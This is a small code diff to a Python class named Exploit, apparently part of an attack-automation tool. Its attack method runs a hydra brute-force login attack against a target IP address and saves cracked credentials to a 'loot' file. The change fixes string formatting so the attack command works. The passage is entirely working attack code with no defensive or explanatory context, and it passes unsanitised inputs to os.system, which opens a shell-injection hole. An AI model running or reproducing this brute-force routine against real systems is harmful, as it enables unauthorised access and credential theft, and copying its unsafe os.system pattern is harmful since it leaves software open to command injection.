@@ -7,8 +7,8 @@ class Exploit:
         pass
     def attack(self, ip_address, usernames, passwords):
         """Run brute force attack against known IP address to find valid credentials"""
-        file_name = './data/loot_{ip_address}_{self.name}.txt'
-        os.system("hydra -L {usernames} -P {passwords} {self.name}://{ip_address} -o {file_name}")
+        file_name = f'./data/loot_{ip_address}_{self.name}.txt'
+        os.system(f"hydra -L {usernames} -P {passwords} {self.name}://{ip_address} -o {file_name}")
         # os.system("hydra -L {usernames} -P {passwords} {ip_address} {self.name} -o  ")
         return_list = []
         loot_file = open(file_name, 'r')
